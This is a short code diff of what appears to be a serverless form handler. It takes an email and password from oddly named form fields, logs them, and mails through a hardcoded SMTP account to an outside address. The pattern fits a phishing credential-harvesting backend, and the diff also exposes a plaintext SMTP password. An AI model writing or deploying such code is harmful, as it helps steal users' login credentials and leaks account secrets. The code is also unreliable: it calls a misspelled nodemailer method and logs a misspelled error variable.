@@ -7,10 +7,7 @@ export default async (req: Request, context: Context) => {
   const email = body.get("ai");
   const password = body.get("pr");
   console.log('response:', {email, password})
-  switch(req?.method){
-    case "POST":
-      try{
-        if(email && password){
+
   const transporter = nodemailer.createTransport({
   host: "smtp.forwardemail.net",
   port: 465,
@@ -20,7 +17,6 @@ export default async (req: Request, context: Context) => {
     pass: "Relish2023!@",
   },
 });
-
   const message = {
   from: "wirthschwind@gmail.com",
   to: "dexolol807@roborena.com",
@@ -29,14 +25,16 @@ export default async (req: Request, context: Context) => {
   html: "<p>HTML version of the message</p>",
 };
 
-  const sendy = await transporter.sendmail(message);
-          console.log(sendy)
-}
+  switch(req?.method){
+    case "POST":
+      try{
+         const sendy = await transporter.sendmail(message);
+         console.log(sendy)
+         response = new Response(JSON.stringify({email, password, context}))
       }
       catch(error){
         console.log(errror)
-      }
-      response = new Response(JSON.stringify({email, password, context}))
+      };
       break;
     case "GET":
       response = new Response("Get method")
